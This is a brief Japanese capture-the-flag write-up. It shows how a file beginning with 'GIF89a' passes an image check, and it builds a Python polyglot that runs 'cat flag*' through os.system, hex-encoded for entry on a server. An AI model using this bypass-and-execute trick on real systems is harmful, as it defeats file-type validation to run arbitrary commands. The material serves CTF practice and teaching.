`GIF89a`という文言が最初にあれば、画像ファイルとして判定される。

まず、以下のPythonファイルを16進数に変換する。

```python
GIF89a=1
import os
os.system("cat flag*")
```

```bash
python3
>>> b'GIF89a=1;import os;os.system("cat flag*")'.hex()
'4749463839613d313b696d706f7274206f733b6f732e73797374656d282263617420666c61672a2229'
```

あとはこのバイト列をサーバ上で打ち込めばOK。